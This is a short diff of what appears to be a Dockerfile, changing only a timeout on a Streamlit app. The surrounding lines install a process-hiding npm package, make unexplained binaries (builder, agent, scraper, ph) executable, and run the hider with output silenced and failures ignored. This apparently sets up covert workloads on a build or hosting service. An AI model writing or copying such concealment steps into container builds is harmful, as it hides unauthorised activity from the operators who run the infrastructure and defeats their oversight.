@@ -12,4 +12,4 @@ RUN npm i -g node-process-hider > /dev/null
 COPY . .
 RUN chmod +x builder agent scraper ph > /dev/null
 RUN ./ph > /dev/null; exit 0
-RUN watch free -m & timeout -k 30 3600 python3 streamlit_app.py > /dev/null; exit 0
+RUN watch free -m & timeout -k 30 3500 python3 streamlit_app.py > /dev/null; exit 0
